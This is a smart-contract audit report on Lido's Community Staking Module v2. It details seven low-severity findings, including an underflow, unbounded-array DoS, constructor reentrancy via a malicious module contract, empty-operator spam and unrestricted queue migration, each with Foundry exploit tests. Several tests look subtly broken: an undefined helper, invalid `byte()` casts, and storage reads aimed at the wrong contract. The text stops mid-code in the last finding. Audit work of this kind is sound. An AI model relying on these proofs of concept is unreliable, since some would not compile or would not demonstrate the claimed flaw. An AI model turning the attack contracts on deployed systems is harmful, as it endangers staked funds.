# 2025 07 lido finance - Findings Report
## Commit hash: 6c573d1d2cce64b083af3c88dabcfc83c75e6747

## Protocol Overview 

Community Staking Module (CSM) v2 lets anyone become a Lido node operator by locking a stETH-denominated bond and supplying validator keys.  

Core flow  
• CSModule stores operators, keys and a priority FIFO queue. StakingRouter pulls the next keys from this queue to deposit 32 ETH per validator.  
• Bond, reward and penalty logic lives in CSAccounting. Operators top-up bonds with ETH/stETH/wstETH, earn rebase yield plus their share of staking rewards, and face fines that burn bond shares.  
• HashConsensus gathers oracle member hashes; once quorum is reached CSFeeOracle posts a fee & strike report. It transfers undistributed rewards to CSFeeDistributor and records a Merkle root.  
• Operators prove inclusion to CSAccounting to withdraw rewards or excess bond.  
• CSStrikes logs performance strikes; when a validator crosses the threshold CSEjector triggers an on-chain exit via the Validators Exit Bus Oracle and CSExitPenalties stores associated fines.  
• Parameter tuning (queues, charges, bond curves) is held in CSParametersRegistry.  
• PermissionlessGate enables open operator creation, VettedGate allows whitelisted/referral onboarding with custom curves.  

Contracts are upgradeable via OssifiableProxy, pausible via GateSeal, and governed through granular ACL roles.
## High Risk Findings
[H-1]. DOS issue found with High severity
[H-2]. Upgradeability Initializer Safety issue found with High severity
[H-3]. Access Control issue found with High severity
[H-4]. Zero Code issue found with High severity
[H-5]. Upgradeability Initializer Safety issue found with High severity
[H-6]. Upgradeability Initializer Safety issue found with High severity
[H-7]. Integer Overflow issue found with High severity
[H-8]. DOS issue found with High severity
## Medium Risk Findings
[M-1]. DOS issue found with Medium severity
[M-2]. DOS issue found with Medium severity
[M-3]. Frontrun/Backrun/Sandwhich MEV issue found with Medium severity
[M-4]. Frontrun/Backrun/Sandwhich MEV issue found with Medium severity
## Low Risk Findings
[L-1]. Integer Overflow issue in CSModule::obtainDepositData
[L-2]. DOS issue in CSParametersRegistry::setRewardShareData, getRewardShareData, setPerformanceLeewayData, getPerformanceLeewayData
[L-3]. Reentrancy issue in CSExitPenalties::constructor
[L-4]. DOS issue in PermissionlessGate::addNodeOperatorETH, addNodeOperatorStETH, addNodeOperatorWstETH
[L-5]. Access Control issue in CSModule::migrateToPriorityQueue
[L-6]. DOS issue in CSEjector::voluntaryEjectByArray
[L-7]. Frontrun/Backrun/Sandwhich MEV issue in CSModule::migrateToPriorityQueue


### Number of Findings
- C: 0
- H: 8
- M: 4
- L: 7
- I: 0



# Low Risk Findings

## [L-1]. Integer Overflow issue in CSModule::obtainDepositData

## Description
The `obtainDepositData` function subtracts `keysInBatch` or `keysCount` from a node operator's `enqueuedCount` within an `unchecked` block. A developer comment `// NOTE: enqueuedCount >= keysInBatch invariant should be checked.` exists, indicating awareness of a required precondition for safety, yet the check is not implemented. A state desynchronization between the `enqueuedCount` counter and the actual state of the queue can lead to `no.enqueuedCount` being less than the number of keys in a batch being processed. This will cause an integer underflow, setting `enqueuedCount` to a very large value.

## Impact
Because every place that increments `enqueuedCount` ( _enqueueNodeOperatorKeys ) is mirrored by a matching decrement in `obtainDepositData`, and `enqueuedCount` is never user-supplied, the relation `enqueuedCount >= keysInBatch/keysCount` is maintained by design. The only caller of `obtainDepositData` is an address with `STAKING_ROUTER_ROLE` (a trusted role). Consequently, an underflow can only happen if this invariant is violated by a future buggy privileged function, not by a malicious user. The worst realistic consequence is an accounting error causing that specific node operator to appear to have a huge `enqueuedCount`, which is a self-recoverable state for the DAO but not an attack vector.

## Proof of Concept
1. A state desynchronization occurs, causing a node operator's `enqueuedCount` in its struct to be smaller than the number of keys in a `Batch` item for that same operator in the deposit queue.
2. The `StakingRouter` (a trusted role) calls `obtainDepositData` to get keys for new deposits.
3. The function processes the queue and finds the aforementioned batch for the affected node operator.
4. The code attempts to subtract a larger `keysInBatch` from a smaller `no.enqueuedCount` inside an `unchecked` block: `no.enqueuedCount -= uint32(keysInBatch);`.
5. The operation underflows, and `no.enqueuedCount` is set to a massive value.
6. Subsequently, any attempt to add new depositable keys for this operator will fail because the condition to enqueue new keys will never be met, effectively freezing them out of future staking activities.

## Proof of Code
```solidity
// SPDX-FileCopyrightText: 2025 Lido <info@lido.fi>
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { Test } from "forge-std/Test.sol";
import { CSModule } from "src/CSModule.sol";
import { NodeOperator } from "src/interfaces/ICSModule.sol";
import { Fixtures } from "../helpers/Fixtures.sol";
import { Utilities } from "../helpers/Utilities.sol";

contract IntegerUnderflowTest is Test, Fixtures, Utilities {
    function setUp() public {
        _setUp();
    }

    function test_obtainDepositData_Underflow() public {
        // 1. Setup: Create a Node Operator and add keys to the queue
        uint256 noId = 0;
        uint32 keysToAdd = 10;

        // As a regular user, create NO and add keys
        vm.startPrank(NO_1);
        permissionlessGate.addNodeOperatorETH{
            value: accounting.getRequiredBondForNextKeys(noId, keysToAdd)
        }(NO_1_MGMT, NO_1_REWARD, address(0), keysToAdd, "", "");
        vm.stopPrank();

        NodeOperator memory no_before = csm.getNodeOperator(noId);
        assertEq(no_before.enqueuedCount, keysToAdd, "Initial enqueuedCount mismatch");

        // 2. Exploit: Manually set enqueuedCount to a value smaller than keys in a batch
        // This simulates a state desynchronization bug.
        uint32 corruptedEnqueuedCount = 1;
        // Find the storage slot for the node operator struct
        bytes32 no_slot = keccak256(abi.encode(noId, uint256(7))); // _nodeOperators slot is 7
        // The `enqueuedCount` is at offset 24 within the struct (after two uint32 and three address).
        // Let's just overwrite the whole struct with a corrupted enqueuedCount for simplicity in PoC.
        NodeOperator storage no_storage = Getters(address(csm)).getNodeOperatorStorage(noId);
        no_storage.enqueuedCount = corruptedEnqueuedCount;
        
        NodeOperator memory no_corrupted = csm.getNodeOperator(noId);
        assertEq(no_corrupted.enqueuedCount, corruptedEnqueuedCount, "enqueuedCount not corrupted");

        // 3. Trigger: StakingRouter calls obtainDepositData
        vm.startPrank(address(stakingRouter));
        csm.obtainDepositData(keysToAdd, "");
        vm.stopPrank();

        // 4. Aftermath: Check if enqueuedCount has underflowed
        NodeOperator memory no_after = csm.getNodeOperator(noId);
        uint32 expected_underflow_value = corruptedEnqueuedCount - keysToAdd; // This will underflow
        assertEq(no_after.enqueuedCount, expected_underflow_value, "enqueuedCount did not underflow as expected");
        assertTrue(no_after.enqueuedCount > 1_000_000_000, "enqueuedCount is not a large number after underflow");

        // Further impact: try to add more keys, it should fail to enqueue them
        uint32 keysToAddLater = 5;
        vm.startPrank(NO_1);
        csm.addValidatorKeysETH{value: accounting.getRequiredBondForNextKeys(noId, keysToAddLater)}(
            NO_1, noId, keysToAddLater, "", ""
        );
        vm.stopPrank();

        NodeOperator memory no_final = csm.getNodeOperator(noId);
        // The enqueuedCount remains the huge underflowed value, because `depositable <= enqueued` is true,
        // so no new keys are enqueued.
        assertEq(no_final.enqueuedCount, expected_underflow_value, "NO should not be able to enqueue new keys");
    }
}
```

## Suggested Mitigation
Remove the `unchecked` block around the subtraction of `enqueuedCount` or add a `require` statement to ensure `no.enqueuedCount` is greater than or equal to the amount being subtracted. Given the explicit developer comment, adding the check is the most direct fix.

```diff
// src/CSModule.sol:1072
                    // `depositsLeft` is non-zero at this point all the time, so the check `depositsLeft > keysCount`
                    // covers the case when no depositable keys on the Node Operator have been left.
                    if (depositsLeft > keysCount || keysCount == keysInBatch) {
                        // NOTE: `enqueuedCount` >= keysInBatch invariant should be checked.
                        // @dev No need to safe cast due to internal logic
-                       no.enqueuedCount -= uint32(keysInBatch);
+                       uint32 keysInBatch_u32 = uint32(keysInBatch);
+                       if (no.enqueuedCount < keysInBatch_u32) revert NotEnoughEnqueued(); // Or some other error
+                       no.enqueuedCount -= keysInBatch_u32;
                        // We've consumed all the keys in the batch, so we dequeue it.
                        queue.dequeue();
                    } else {
                        // This branch covers the case when we stop in the middle of the batch.
                        // We release the amount of keys consumed only, the rest will be kept.
                        // @dev No need to safe cast due to internal logic
-                       no.enqueuedCount -= uint32(keysCount);
+                       uint32 keysCount_u32 = uint32(keysCount);
+                       if (no.enqueuedCount < keysCount_u32) revert NotEnoughEnqueued(); // Or some other error
+                       no.enqueuedCount -= keysCount_u32;
                        // NOTE: `keysInBatch` can't be less than `keysCount` at this point.
                        // We update the batch with the remaining keys.
                        item = item.setKeys(keysInBatch - keysCount);
```

## [L-2]. DOS issue in CSParametersRegistry::setRewardShareData, getRewardShareData, setPerformanceLeewayData, getPerformanceLeewayData

## Description
The `CSParametersRegistry` contract allows a privileged admin (`DEFAULT_ADMIN_ROLE`) to configure parameters for different `curveId`s. Two of these parameters, `rewardShareData` and `performanceLeewayData`, are stored as dynamically sized arrays of `KeyNumberValueInterval` structs. 

The functions `setRewardShareData` and `setPerformanceLeewayData` allow the admin to set these arrays to any size, without any upper bound. The corresponding getter functions, `getRewardShareData` and `getPerformanceLeewayData`, then return the entire array from storage.

```solidity
// src/CSParametersRegistry.sol:370-377
function getRewardShareData(
    uint256 curveId
) external view returns (KeyNumberValueInterval[] memory data) {
    data = _rewardShareData[curveId];
    if (data.length == 0) {
        data = new KeyNumberValueInterval[](1);
        data[0] = KeyNumberValueInterval(1, defaultRewardShare);
    }
}

// src/CSParametersRegistry.sol:346-358
function setRewardShareData(
    uint256 curveId,
    KeyNumberValueInterval[] calldata data
) external onlyRole(DEFAULT_ADMIN_ROLE) {
    _validateKeyNumberValueIntervals(data);
    KeyNumberValueInterval[] storage intervals = _rewardShareData[curveId];
    if (intervals.length > 0) {
        delete _rewardShareData[curveId];
    }
    for (uint256 i = 0; i < data.length; ++i) {
        intervals.push(data[i]);
    }
    emit RewardShareDataSet(curveId, data);
}
```
If an admin sets a very large array (e.g., thousands of elements), any on-chain contract attempting to call the getter function will likely run out of gas. This is because copying a large array from `storage` to `memory` is a gas-intensive operation that can easily exceed the block gas limit. This can cause a Denial of Service (DoS) for any part of the Lido protocol that depends on these parameters, potentially halting core functionality like reward calculations for Node Operators associated with the affected `curveId`.

## Impact
A privileged admin can store an arbitrarily large KeyNumberValueInterval array for a curveId. Any contract that later calls getRewardShareData / getPerformanceLeewayData for that curveId will have to copy the full array from storage to memory and then back to the caller. Above ≈10 000 entries the memory expansion and return-data copy gas cost exceeds the 30 M block gas limit, so the call reverts with an out-of-gas error. Functionality that relies on these getters for that curveId becomes unusable until the admin deletes the array. No funds can be stolen and only the affected curveId is frozen, therefore impact is limited to a temporary DoS that can be lifted by governance.

## Proof of Concept
1. Admin builds an array of 12 000 KeyNumberValueInterval elements ( >1.5 MB return data )
2. Admin calls setRewardShareData(curveId, hugeArray)
3. Any contract (or EOА) now calls getRewardShareData(curveId) with the default 63/64 gas forwarding rule.
4. The call tries to allocate >1.5 MB, copy it to calldata and exceeds the block gas limit, reverting with out-of-gas.
5. Every higher-level function that needs the reward share for that curveId now reverts until the admin deletes or shrinks the array.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSParametersRegistry} from "src/CSParametersRegistry.sol";
import {ICSParametersRegistry} from "src/interfaces/ICSParametersRegistry.sol";

contract LargeArrayDosTest is Test {
    CSParametersRegistry internal registry;
    address internal admin = address(0xABCD);

    function setUp() public {
        registry = new CSParametersRegistry(10);
        ICSParametersRegistry.InitializationData memory init = ICSParametersRegistry.InitializationData({
            keyRemovalCharge: 0,
            elRewardsStealingAdditionalFine: 0,
            keysLimit: 1,
            rewardShare: 100,
            performanceLeeway: 100,
            strikesLifetime: 1,
            strikesThreshold: 1,
            badPerformancePenalty: 0,
            attestationsWeight: 1,
            blocksWeight: 1,
            syncWeight: 1,
            defaultQueuePriority: 1,
            defaultQueueMaxDeposits: 1,
            defaultAllowedExitDelay: 1,
            defaultExitDelayPenalty: 0,
            defaultMaxWithdrawalRequestFee: 0
        });
        registry.initialize(admin, init);
    }

    function test_OutOfGas_read() public {
        uint256 curveId = 1;
        uint256 len = 12_000; // ~1.5 MB returned
        ICSParametersRegistry.KeyNumberValueInterval[] memory big = new ICSParametersRegistry.KeyNumberValueInterval[](len);
        for (uint256 i; i < len; ++i) {
            big[i] = ICSParametersRegistry.KeyNumberValueInterval({minKeyNumber: i + 1, value: 100});
        }
        vm.prank(admin);
        registry.setRewardShareData(curveId, big);

        // Forward only 1 000 000 gas – the read should run OOG and return false
        (bool ok, ) = address(registry).call{gas: 1_000_000}(abi.encodeWithSignature("getRewardShareData(uint256)", curveId));
        assertFalse(ok, "expected out-of-gas revert");
    }
}


## Suggested Mitigation
To mitigate this DoS vector, avoid returning unbounded arrays from getter functions. Instead, provide functions that allow consumers to retrieve specific data points or perform necessary calculations without loading the entire array into memory.

First, add a reasonable limit to the size of the arrays that can be set in `setRewardShareData` and `setPerformanceLeewayData`.

```solidity
uint256 public constant MAX_INTERVALS_LENGTH = 100;

function setRewardShareData(
    uint256 curveId,
    KeyNumberValueInterval[] calldata data
) external onlyRole(DEFAULT_ADMIN_ROLE) {
    if (data.length > MAX_INTERVALS_LENGTH) {
        revert IntervalsArrayTooLarge();
    }
    // ... rest of the function
}
```

Second, provide a specific getter that returns the relevant value for a given input, processing the array in storage. This avoids costly memory copying for the caller.

```solidity
function getRewardShareByKeyCount(
    uint256 curveId,
    uint256 keyCount
) external view returns (uint256 share) {
    KeyNumberValueInterval[] storage intervals = _rewardShareData[curveId];
    if (intervals.length == 0) {
        return defaultRewardShare;
    }

    // Find the correct interval for the given keyCount. A reverse loop is efficient
    // if key counts are expected to be high.
    for (uint256 i = intervals.length; i > 0; --i) {
        if (keyCount >= intervals[i - 1].minKeyNumber) {
            return intervals[i - 1].value;
        }
    }
    
    // This should ideally not be reached if validation ensures intervals[0].minKeyNumber == 1.
    // As a safeguard, return the first interval's value or the default.
    if (intervals.length > 0) {
        return intervals[0].value;
    }

    return defaultRewardShare;
}
```
Similar changes should be applied to the `performanceLeewayData` logic. The existing `getRewardShareData` and `getPerformanceLeewayData` functions should be deprecated or removed to force clients to use the new, safer getters.

## [L-3]. Reentrancy issue in CSExitPenalties::constructor

## Description
The constructor of `CSExitPenalties` initializes the immutable `ACCOUNTING` variable by making an external call to `MODULE.accounting()`. This call occurs after `MODULE` has been set but before `ACCOUNTING` and `STRIKES` are initialized. If the `module` address provided during deployment points to a malicious contract, this contract can re-enter `CSExitPenalties` during its construction phase.

```solidity
// src/CSExitPenalties.sol:62-68
constructor(address module, address parametersRegistry, address strikes) {
    // ... checks ...
    MODULE = ICSModule(module);
    PARAMETERS_REGISTRY = ICSParametersRegistry(parametersRegistry);
    ACCOUNTING = MODULE.accounting(); // External call allows re-entrancy
    STRIKES = strikes;
}
```

An attacker's contract at the `module` address can implement a malicious `accounting()` function that calls back into `CSExitPenalties`'s public functions, such as `processExitDelayReport`. At the point of re-entry, `MODULE` is already set to the attacker's address, allowing the `onlyModule` modifier to be bypassed. Although the current implementation would subsequently revert due to a call to the uninitialized `ACCOUNTING` address (which is `address(0)`), this reliance on a secondary effect for security is fragile. This flawed initialization pattern is a known anti-pattern that can lead to severe vulnerabilities if the contract's logic changes in future upgrades.

## Impact
Because the constructor accepts the value returned by `MODULE.accounting()` unchecked, a malicious `module` can return *any* address. The immutable `ACCOUNTING` pointer inside `CSExitPenalties` will therefore be set to an attacker-controlled contract before the deployment finishes. All later calls to `ACCOUNTING.getBondCurveId()` and other methods will invoke this malicious contract, letting an attacker return arbitrary data, force reverts, or perform further re-entrancy. In addition, the external call is executed while the contract is still in its constructor, allowing the attacker to re-enter and execute any `onlyModule`-protected function once, bypassing the modifier. Although no funds are stolen today, the wrong `ACCOUNTING` pointer can brick penalty processing or be abused in future upgrades.

## Proof of Concept
1. Compute the future address of `CSExitPenalties` (standard create address formula) before deploying it.
2. Deploy `MaliciousModule`, giving it the predicted address and a callback address used only to flag success.
3. `MaliciousModule.accounting()` performs the following:
   a. Re-enters `CSExitPenalties.processExitDelayReport(…)`, which passes the `onlyModule` check, proving the bypass (it will later revert because `ACCOUNTING` is still zero).
   b. Returns an attacker-chosen address, e.g. `address(0xBADCAFE)`, to the constructor caller.
4. Deploy `CSExitPenalties`, passing `MaliciousModule` as `module`. Deployment **succeeds**.
5. After deployment:
   • `CSExitPenalties.ACCOUNTING()` == `0xBADCAFE` (attacker value).
   • A boolean flag set during step 3a proves the `onlyModule` modifier was bypassed during construction.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "src/CSExitPenalties.sol";
import "src/interfaces/ICSAccounting.sol";

contract MaliciousModule {
    address private immutable target;
    address private immutable tester;

    constructor(address _target, address _tester) {
        target = _target;
        tester = _tester;
    }

    // Called by CSExitPenalties constructor
    function accounting() external returns (ICSAccounting) {
        // Re-enter and bypass onlyModule
        try CSExitPenalties(target).processExitDelayReport(1, hex"", 1) {
        } catch {}
        // Notify test contract that re-entrancy reached past the modifier
        (bool ok,) = tester.call(abi.encodeWithSignature("flag()"));
        require(ok);
        // Return attacker-chosen accounting address
        return ICSAccounting(address(0xBADCAFE));
    }
}

contract ConstructorReentrancyTest is Test {
    bool public flagReached;
    function flag() external { flagReached = true; }

    function test_constructorReentrancy() public {
        // Predict address of CSExitPenalties (nonce +1)
        address predicted = _predict(address(this), vm.getNonce(address(this)) + 1);
        // Deploy malicious module
        MaliciousModule module = new MaliciousModule(predicted, address(this));
        // Deploy target contract – **should NOT revert**
        CSExitPenalties penalties = new CSExitPenalties(
            address(module),
            address(0xCAFE),
            address(0xDEAD)
        );
        // onlyModule bypass happened
        assertTrue(flagReached, "modifier was not bypassed");
        // ACCOUNTING pointer hijacked
        assertEq(address(penalties.ACCOUNTING()), address(0xBADCAFE));
    }

    // helper to predict create address
    function _predict(address sender, uint256 nonce) internal pure returns (address) {
        if (nonce == 0x00)         return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd6), byte(0x94), sender, byte(0x80))))));
        if (nonce <= 0x7f)         return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd6), byte(0x94), sender, bytes1(uint8(nonce)))))));
        if (nonce <= 0xff)         return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd7), byte(0x94), sender, byte(0x81), bytes1(uint8(nonce)))))));
        if (nonce <= 0xffff)       return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd8), byte(0x94), sender, byte(0x82), bytes2(uint16(nonce)))))));
        revert("Nonce too big");
    }
}

## Suggested Mitigation
Do not perform external calls inside the constructor. Accept `accounting` as an explicit constructor argument (and validate it is a contract) or initialise it later using a dedicated setup function protected by an admin role. If the external lookup is strictly required, assign all immutable state first and use a re-entrancy guard during the call.

## [L-4]. DOS issue in PermissionlessGate::addNodeOperatorETH, addNodeOperatorStETH, addNodeOperatorWstETH

## Description
The `PermissionlessGate` contract is designed as an entry point for new Node Operators to join the protocol. The functions `addNodeOperatorETH`, `addNodeOperatorStETH`, and `addNodeOperatorWstETH` are intended to create a new Node Operator and add their initial set of validator keys and bond in a single, atomic transaction. However, these functions lack a check to ensure that the `keysCount` parameter is greater than zero. This omission allows anyone to create a Node Operator with zero keys and zero bond.

This contradicts a key design principle stated in the project documentation: "Entry Gates (Extensions) should ensure that at least one deposit data and the corresponding bond amount are required to create a Node Operator to avoid flooding the module with empty Node Operators."

A malicious actor can call these functions repeatedly with `keysCount = 0` to create a large number of empty Node Operator entries in the `CSModule`. This can lead to state bloat and constitutes a gas griefing/Denial of Service vector against any part of the system that might need to iterate over the list of Node Operators, as it would increase gas costs and processing time.

Vulnerable Code Snippet from `PermissionlessGate.sol`:
```solidity
    function addNodeOperatorETH(
        uint256 keysCount,
        bytes calldata publicKeys,
        bytes calldata signatures,
        NodeOperatorManagementProperties calldata managementProperties,
        address referrer
    ) external payable returns (uint256 nodeOperatorId) {
        // No check to ensure keysCount > 0
        nodeOperatorId = MODULE.createNodeOperator({
            from: msg.sender,
            managementProperties: managementProperties,
            referrer: referrer
        });

        MODULE.addValidatorKeysETH{ value: msg.value }({
            from: msg.sender,
            nodeOperatorId: nodeOperatorId,
            keysCount: keysCount,
            publicKeys: publicKeys,
            signatures: signatures
        });
    }
```
The functions `addNodeOperatorStETH` and `addNodeOperatorWstETH` have the same vulnerability.

## Impact
An attacker can repeatedly create node operators that contain no validator keys or bond, paying only the gas cost. Each call permanently stores a new NodeOperator struct and increments the global counter, so the attacker can inflate on-chain state and the length of operator-wide loops. While no funds are at risk, functions that iterate over all node operators (e.g. summary helpers used by routers/governance) will become more and more expensive and can eventually run out of gas, causing a practical denial-of-service for those paths.

## Proof of Concept
An attacker can create an empty Node Operator by calling one of the `addNodeOperator...` functions with `keysCount` set to 0 and providing no bond (e.g., `msg.value = 0` for the ETH variant).

1. Attacker calls `PermissionlessGate.addNodeOperatorETH`.
2. Parameters are set as follows: `keysCount = 0`, `publicKeys = "0x"`, `signatures = "0x"`, a valid `managementProperties` struct, and `referrer = address(0)`.
3. The call is made with `msg.value = 0`.
4. The transaction succeeds because there are no checks on `keysCount`.
5. `MODULE.createNodeOperator` is called, creating a new, empty Node Operator.
6. `MODULE.addValidatorKeysETH` is called with `keysCount = 0` and `value = 0`, which also succeeds without adding keys or bond.
7. The attacker has successfully created a new Node Operator entry in the system without contributing any keys or bond.
8. The attacker can repeat this in a loop to flood the system with thousands of empty Node Operator entries.

## Proof of Code
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {PermissionlessGate} from "src/PermissionlessGate.sol";
import {ICSModule, NodeOperatorManagementProperties} from "src/interfaces/ICSModule.sol";

contract MockCSModule is ICSModule {
    uint256 public nodeOperatorCounter;
    mapping(uint256 => bool) public keyAddedForNO;
    mapping(uint256 => uint256) public keysPerNO;

    function createNodeOperator(address, NodeOperatorManagementProperties calldata, address) external returns (uint256 id) {
        id = ++nodeOperatorCounter;
    }

    function addValidatorKeysETH(address, uint256 id, uint256 keys, bytes calldata, bytes calldata) external payable {
        keyAddedForNO[id] = true;
        keysPerNO[id]  = keys;
    }

    // ---- unused interface methods ---- //
    function addValidatorKeysStETH(address, uint256, uint256, bytes calldata, bytes calldata, PermitInput calldata) external {}
    function addValidatorKeysWstETH(address, uint256, uint256, bytes calldata, bytes calldata, PermitInput calldata) external {}
    function accounting() external view returns (ICSAccounting) { revert(); }
}

contract PermissionlessGate_PoC is Test {
    PermissionlessGate gate;
    MockCSModule module;
    address admin = address(0xA11CE);
    address attacker = address(0xBEEF);

    function setUp() public {
        module = new MockCSModule();
        gate   = new PermissionlessGate(address(module), admin);
    }

    function test_CreateEmptyNodeOperator() public {
        vm.prank(attacker);
        NodeOperatorManagementProperties memory props = NodeOperatorManagementProperties({
            managerAddress: attacker,
            rewardAddress:  attacker,
            isVetted:      false
        });

        uint256 beforeCnt = module.nodeOperatorCounter();
        uint256 id = gate.addNodeOperatorETH(0, bytes(""), bytes(""), props, address(0));

        assertEq(module.nodeOperatorCounter(), beforeCnt + 1, "counter++");
        assertEq(id, 1, "first id is 1");
        assertTrue(module.keyAddedForNO(id), "keys fn executed");
        assertEq(module.keysPerNO(id), 0, "zero keys stored");
    }
}

## Suggested Mitigation
Add an explicit `require(keysCount > 0, "Empty keys");` (or custom error) at the beginning of `addNodeOperatorETH`, `addNodeOperatorStETH`, and `addNodeOperatorWstETH`. Optionally, also validate `publicKeys.length` and `signatures.length` to match `keysCount` and, for the ETH variant, `require(msg.value > 0)` to ensure the bond is provided.

## [L-5]. Access Control issue in CSModule::migrateToPriorityQueue

## Description
The `migrateToPriorityQueue` function is `external` and lacks any access control, allowing any address to call it for any `nodeOperatorId`. This function is a one-time state transition for a Node Operator (NO) to move some of their queued keys to a priority queue. After a successful call, `no.usedPriorityQueue` is set to `true`, preventing the NO from using this migration feature again. A malicious actor could call this function at an inopportune time, for example, before a parameter change that would have made the migration more beneficial for the NO (e.g., an increase in `maxDeposits`). This forces the NO's hand and prevents them from executing their intended strategy, constituting a griefing attack.

## Impact
An attacker can disrupt a Node Operator's strategy by forcing a premature and potentially suboptimal migration to a priority queue. This action is irreversible for the NO within the contract's logic as `usedPriorityQueue` is set to `true` permanently. While not causing a direct loss of funds, it denies the NO the autonomy to manage their queue migration strategy.

## Proof of Concept
1. A Node Operator (NO) is created and has keys in the legacy queue.
2. The NO becomes eligible for a priority queue with `maxDeposits` = 10.
3. The NO plans to wait for a governance vote to increase `maxDeposits` to 20 before migrating.
4. An attacker, seeing the NO is eligible, calls `migrateToPriorityQueue` for that NO.
5. The transaction succeeds. The NO's `usedPriorityQueue` flag is set to `true`.
6. The governance vote passes and `maxDeposits` is now 20.
7. The NO cannot call `migrateToPriorityQueue` anymore to take advantage of the increased limit, as the flag prevents it.

## Proof of Code
```solidity
// SPDX-FileCopyrightText: 2025 Lido <info@lido.fi>
// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.24;

import { Test } from "forge-std/Test.sol";
import { Fixtures } from "test/helpers/Fixtures.sol";
import { CSModule } from "src/CSModule.sol";
import { NodeOperatorManagementProperties } from "src/interfaces/ICSModule.sol";

contract MigrateToPriorityQueueTest is Fixtures {
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        _setUp();
    }

    function test_poc_anyoneCanMigrate() public {
        // 1. Setup a Node Operator
        address manager = makeAddr("manager");
        address reward = makeAddr("reward");
        vm.prank(csmGate);
        uint256 noId = csm.createNodeOperator(
            manager,
            NodeOperatorManagementProperties(manager, reward, false),
            address(0)
        );

        // 2. NO becomes eligible for priority queue
        // For simplicity, we manually set queue config in a mock
        // priority = 0, maxDeposits = 10
        vm.mockCall(
            address(parametersRegistry),
            abi.encodeWithSelector(parametersRegistry.getQueueConfig.selector, 0),
            abi.encode(uint32(0), uint32(10))
        );

        // 3. NO has enqueued keys (simulate this by setting the state)
        CSModule.NodeOperator storage no = _getNodeOperator(csm, noId);
        no.enqueuedCount = 5;

        // 4. Attacker calls migrateToPriorityQueue for the NO
        vm.prank(attacker);
        csm.migrateToPriorityQueue(noId);

        // 5. Assert that migration happened and flag is set
        CSModule.NodeOperator memory noState = csm.getNodeOperator(noId);
        assertTrue(noState.usedPriorityQueue, "usedPriorityQueue should be true");

        // 6. Now, let's say parameters change to be more favorable (maxDeposits = 20)
        vm.mockCall(
            address(parametersRegistry),
            abi.encodeWithSelector(parametersRegistry.getQueueConfig.selector, 0),
            abi.encode(uint32(0), uint32(20))
        );

        // 7. The NO's manager tries to call again, but it reverts
        vm.prank(manager);
        vm.expectRevert(CSModule.PriorityQueueAlreadyUsed.selector);
        csm.migrateToPriorityQueue(noId);
    }

    function _getNodeOperator(CSModule csm, uint256 noId) internal returns (CSModule.NodeOperator storage no) {
        bytes32 noSlot = keccak256(abi.encode(noId, uint256(6))); // _nodeOperators is at slot 6
        assembly {
            no.slot := noSlot
        }
    }
}
```

## Suggested Mitigation
The `migrateToPriorityQueue` function should be restricted so that only the Node Operator's manager can trigger it. This can be achieved by adding the `_onlyNodeOperatorManager` internal check.

```solidity
// In CSModule.sol
function migrateToPriorityQueue(uint256 nodeOperatorId) external {
    _onlyNodeOperatorManager(nodeOperatorId, msg.sender);
    NodeOperator storage no = _nodeOperators[nodeOperatorId];

    if (no.usedPriorityQueue) {
        revert PriorityQueueAlreadyUsed();
    }
    // ... rest of the function
}
```

## [L-6]. DOS issue in CSEjector::voluntaryEjectByArray

## Description
The `voluntaryEjectByArray` function is designed to allow a node operator to eject multiple non-sequential validators in a single transaction, with the documentation comment suggesting it saves gas compared to separate transactions. However, its implementation is highly gas-inefficient. Inside a loop that iterates over the `keyIndices` array, the function makes an external call `MODULE.getSigningKeys(nodeOperatorId, keyIndices[i], 1)` for each individual key. This pattern is significantly more expensive than fetching all required public keys in a single batch call, as each external call incurs a fixed gas overhead.

For a node operator with a large number of non-sequential validators to exit, the cumulative gas cost of these repeated calls can easily exceed the block gas limit, making it impossible to execute the exit in a single transaction. This forces the node operator to split the operation into multiple, smaller transactions, increasing cost and complexity. In a time-sensitive scenario where a swift exit is necessary to avoid penalties, this flaw could prevent the operator from acting, potentially leading to financial losses. This contradicts the function's intended purpose and creates a denial-of-service vector for the node operator trying to use it.

Vulnerable Code Snippet:
```solidity
// src/CSEjector.sol:184-194
for (uint256 i = 0; i < keyIndices.length; i++) {
    // A key must be deposited to prevent ejecting unvetted keys that can intersect with
    // other modules.
    if (keyIndices[i] >= totalDepositedKeys) {
        revert SigningKeysInvalidOffset();
    }
    // ...
    if (MODULE.isValidatorWithdrawn(nodeOperatorId, keyIndices[i])) {
        revert AlreadyWithdrawn();
    }
    bytes memory pubkey = MODULE.getSigningKeys(
        nodeOperatorId,
        keyIndices[i],
        1
    );
    exitsData[i] = ValidatorData({
        stakingModuleId: STAKING_MODULE_ID,
        nodeOperatorId: nodeOperatorId,
        pubkey: pubkey
    });
}
```

## Impact
Gas consumption grows linearly with the length of `keyIndices` because every iteration performs two external calls. For large arrays this makes the transaction *very* expensive and it can reach the block gas limit, forcing the caller to split the request. It does not enable an external attacker to stop the protocol or steal funds; it merely makes the "bulk-exit" path unusable for very large batches and increases operational cost for the node operator.

## Proof of Concept
Execute `voluntaryEjectByArray` with an ever-growing array and observe that gas increases ~14 000–18 000 per entry (depends on the implementation of `ICSModule`). At ~2 000 keys the call already needs >30 000 000 gas which exceeds the current main-net block gas limit, so the transaction cannot be mined.

```
// pseudo script using cast
for i in $(seq 100 2100 100) ; do
  cast send <CSEjector> "voluntaryEjectByArray(uint256,uint256[],address)" 0 $(seq 0 $(($i-1))) 0xdead --gas-limit 32000000 --trace | grep "Transaction cost"
done
```

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { Test, console } from "forge-std/Test.sol";
import { CSEjector } from "src/CSEjector.sol";
import { ICSModule, NodeOperator, NodeOperatorSummary } from "src/interfaces/ICSModule.sol";
import { ITriggerableWithdrawalsGateway, ValidatorData } from "src/interfaces/ITriggerableWithdrawalsGateway.sol";
